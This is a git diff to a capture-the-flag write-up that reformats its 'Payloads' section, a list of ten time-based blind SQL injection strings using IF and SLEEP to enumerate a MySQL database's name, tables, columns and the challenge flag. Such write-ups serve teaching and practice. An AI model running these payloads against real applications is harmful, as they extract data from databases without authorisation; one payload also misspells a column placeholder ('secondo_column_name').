@@ -229,16 +229,18 @@ Flag is <code>bucket{h4d35t_sql1_2b05bc}</code>.
 
 ## Payloads
 
-<code>' OR 1=IF((SELECT LENGTH(database()))=numeric_value, SLEEP(5), 1)#</code> for the length of the database name<br>
-<code>' OR 1=IF((SELECT database()) LIKE 'substring%', SLEEP(5), 1)#</code> for database name<br>
-<code>' OR 1=IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=numeric_value, SLEEP(5), 1)#</code> for the tables count in the database<br>
-<code>' OR 1=IF((SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)=numeric_value, SLEEP(5), 1)#</code> for the length of the first table name<br>
-<code>' OR 1=IF((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1) LIKE 'substring%', SLEEP(5), 1)#</code> for the first table name<br>
-<code>' OR 1=IF((SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='first_table_name')=numeric_value, SLEEP(5), 1)#</code> for the columns count in the first table<br>
-<code>' OR 1=IF((SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='first_table_name' LIMIT 1,1)=numeric_value, SLEEP(5), 1)#</code> for the length of the second column name of the first table<br>
-<code>' OR 1=IF((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='first_table_name' LIMIT 1,1) LIKE 'substring%', SLEEP(5), 1)#</code> for the second column name of the first table<br>
-<code>' OR 1=IF((SELECT LENGTH(secondo_column_name) FROM first_table_name LIMIT 0,1)=numeric_value, SLEEP(10), 1)#</code> for the length of the flag<br>
-<code>' OR 1=IF((SELECT second_column_name FROM first_table_name LIMIT 0,1) LIKE 'substring%', SLEEP(12), 1)#</code> for the flag<br>
+These payloads should be used in loops with different values.
+
++ <code>' OR 1=IF((SELECT LENGTH(database()))=numeric_value, SLEEP(5), 1)#</code> for the length of the database name<br>
++ <code>' OR 1=IF((SELECT database()) LIKE 'substring%', SLEEP(5), 1)#</code> for database name<br>
++ <code>' OR 1=IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=numeric_value, SLEEP(5), 1)#</code> for the tables count in the database<br>
++ <code>' OR 1=IF((SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)=numeric_value, SLEEP(5), 1)#</code> for the length of the first table name<br>
++ <code>' OR 1=IF((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1) LIKE 'substring%', SLEEP(5), 1)#</code> for the first table name<br>
++ <code>' OR 1=IF((SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='first_table_name')=numeric_value, SLEEP(5), 1)#</code> for the columns count in the first table<br>
++ <code>' OR 1=IF((SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='first_table_name' LIMIT 1,1)=numeric_value, SLEEP(5), 1)#</code> for the length of the second column name of the first table<br>
++ <code>' OR 1=IF((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='first_table_name' LIMIT 1,1) LIKE 'substring%', SLEEP(5), 1)#</code> for the second column name of the first table<br>
++ <code>' OR 1=IF((SELECT LENGTH(secondo_column_name) FROM first_table_name LIMIT 0,1)=numeric_value, SLEEP(10), 1)#</code> for the length of the flag<br>
++ <code>' OR 1=IF((SELECT second_column_name FROM first_table_name LIMIT 0,1) LIKE 'substring%', SLEEP(12), 1)#</code> for the flag<br>
 
 ## References
 <a id="1">[1]</a> 
